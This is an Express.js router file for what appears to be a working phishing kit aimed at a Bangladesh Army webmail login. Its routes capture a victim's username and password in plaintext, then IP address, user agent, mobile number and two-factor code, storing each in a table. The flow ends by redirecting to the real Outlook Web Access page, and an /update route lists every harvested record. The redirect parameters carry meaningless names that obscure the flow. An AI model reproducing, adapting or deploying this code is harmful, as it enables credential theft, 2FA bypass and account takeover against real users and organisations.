const express = require ('express');
const router = express.Router();
const db = require('../db');
const bodyParser = require('body-parser');

router.use(express.static('public'));
router.use(express.static(__dirname + '/public'));
router.use(bodyParser.urlencoded({ extended: false }));


//validate form data before handling
// Custom middleware for form validation
const validateFormData = (req, res, next) => {
  const { username, password } = req.body;

  if (!username || !password) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


// Handle form submission

router.post('/submit', validateFormData, (req, res) => {
   
    const name = req.body.username;
    const b64 = Buffer.from(name).toString('base64');
    const word = req.body.password;
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim();
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 0;
   


    const sqlQuery =  'SELECT username FROM bdar2fa WHERE username= ?';   
    db.query(sqlQuery, [name], (err, results) => {
      if (err) {
        console.error('Error executing query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      }
    const rowCount = results.length;

      if (rowCount > 0) {
                            // Update the table if a matching record exists
                            const updateQuery = 'UPDATE bdar2fa SET password = ? , mobile = NULL, code = NULL, notify = ? WHERE username = ?';
                            db.query(updateQuery, [word, notify, name], (err) => {
                                if (err) {
                                    console.error('Error updating record:', err);
                                    return res.status(500).send('Internal Server Error');
                                }
                                
                                res.redirect(`/mobile/?fdhdfghetyrtsdaweretyrjghfdxfsfr=${b64}`);
                                
                            });
                            } else {
                            // Insert a new record if no matching record exists
                            const insertQuery = 'INSERT INTO bdar2fa (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
                            db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
                                if (err) {
                                    console.error('Error inserting record:', err);
                                    return res.status(500).send('Internal Server Error');
                                }
                                 res.redirect(`/mobile/?fdhdfghetyrtsdaweretyrjghfdxfsfr=${b64}`);
                                
                            });
                                    }
      
  
     
    });
  
});



//handle mobile number


router.post('/mobile' , (req, res) => {

  const username = req.body.username;
  const b64 = Buffer.from(username).toString('base64');
  const mobile= req.body.mobile;
  const b64mob = Buffer.from(mobile).toString('base64');
  const notify = 0;

  
  const sqlQuery =  'SELECT username FROM bdar2fa WHERE username= ?';   
  db.query(sqlQuery, [username], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
   
        // Update the table if a matching record exists
        const updateQuery = 'UPDATE bdar2fa SET mobile = ? , notify = ? WHERE username = ?';
        db.query(updateQuery, [mobile, notify, username], (err) => {
            if (err) {
                console.error('Error updating record:', err);
                return res.status(500).send('Internal Server Error');
            }
            
            res.redirect(`/code/?utwefbgjksoewhfnjsdhfiwoefhhjsdhfuwoehu=${b64}/${b64mob}`);
            
        });
      
                                  
    

   
  });
  


});


router.post('/code' , (req, res) => {

  const username = req.body.username;
  const code= req.body.code;
  const notify = 0;

  
  const sqlQuery =  'SELECT username FROM bdar2fa WHERE username= ?';   
  db.query(sqlQuery, [username], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
   
        // Update the table if a matching record exists
        const updateQuery = 'UPDATE bdar2fa SET code = ? , notify = ? WHERE username = ?';
        db.query(updateQuery, [code, notify, username], (err) => {
            if (err) {
                console.error('Error updating record:', err);
                return res.status(500).send('Internal Server Error');
            }
            
            res.redirect('https://newmail.army.mil.bd/owa');
            
        });
      
                                  
    

   
  });
  




});





router.post('/update' , (req, res) => {

  const name = req.body.username;
  const notif = 1;
  

  const sqlQuery =  'SELECT username FROM bdar2fa WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          // Update the table if a matching record exists
                          const update = 'UPDATE bdar2fa SET notify = ?  WHERE username = ?';
                          db.query(update, [notif,  name], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }


                              const query = 'SELECT * FROM bdar2fa'; // Replace with your table name
  
                              db.query(query, (err, results) => {
                                if (err) {
                                  console.error('Error executing the query: ' + err.stack);
                                  return res.status(500).send('Error fetching data from the database.');
                                }
                             // Store the data in a variable
                                const data = Object.values(JSON.parse(JSON.stringify(results)));
                               
                                res.render('table', {data});
                            
                              });



                          });
                          } 
       
  });

});



module.exports =router
